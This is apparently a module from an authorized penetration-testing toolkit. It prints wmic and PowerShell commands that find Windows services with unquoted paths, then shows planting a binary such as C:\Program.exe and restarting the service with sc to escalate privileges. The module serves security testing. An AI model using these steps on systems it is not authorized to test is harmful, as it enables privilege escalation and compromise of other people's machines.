"""Unquoted service path hijacking — DLL/EXE planting."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.privesc.unquoted_svc_path.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["service_manipulation", "file_write"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1574.009"],
}


def run(args: Any) -> int:
    print("[*] Unquoted Service Path Hijacking")

    print("\n[*] Enumeration:")
    print('  wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """')
    print("\n  PowerShell:")
    print('  Get-WmiObject win32_service | Where-Object {$_.PathName -notlike "C:\\Windows*" -and $_.PathName -notlike \'\"*\'} | Select Name,PathName,StartMode')

    print("\n[*] Example:")
    print("  Service path: C:\\Program Files\\Vuln Service\\service.exe")
    print("  Hijack: Place C:\\Program.exe or C:\\Program Files\\Vuln.exe")
    print("  Restart: sc stop <service> && sc start <service>")

    return 0
